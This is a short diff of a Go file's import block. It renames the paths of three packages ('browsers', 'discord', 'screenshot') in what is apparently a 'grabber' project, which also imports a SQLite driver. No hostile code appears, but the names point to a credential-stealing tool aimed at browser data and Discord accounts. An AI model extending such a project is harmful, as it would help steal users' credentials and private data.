@@ -6,9 +6,10 @@ import (
 	"os"
 	"time"
 
-	"example.com/grabber/browsers"
-	"example.com/grabber/discord"
-	"example.com/grabber/screenshot"
+	"kdot/grabber/browsers"
+	"kdot/grabber/discord"
+	"kdot/grabber/screenshot"
+
 	_ "github.com/mattn/go-sqlite3"
 )
 
